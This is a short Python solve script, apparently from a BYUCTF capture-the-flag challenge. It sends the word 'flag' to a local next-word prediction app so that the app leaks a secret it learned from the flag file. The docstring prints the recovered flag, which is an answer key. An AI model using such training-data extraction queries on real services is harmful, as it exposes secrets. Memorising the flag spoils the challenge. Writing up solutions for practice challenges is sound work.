import requests
import json

"""
The app predicts the next word.
The word "flag" only exists in the flag file.
Making it guess what comes after "flag" gives us the flag.

Because of the sanitization of the words,
we'll need to guess where some of the punctuation goes.

The flag comes out as byuctfiamnotanoracleuxmxykhe,
but we know the format is byuctf{example_flag_cfavvhqx},
so we can infer the original to be byuctf{i_am_not_an_oracle_uxmxykhe}.
"""

print(json.loads(requests.post("http://localhost:80/",
      json={"word": "flag"}).text)["next"][0])
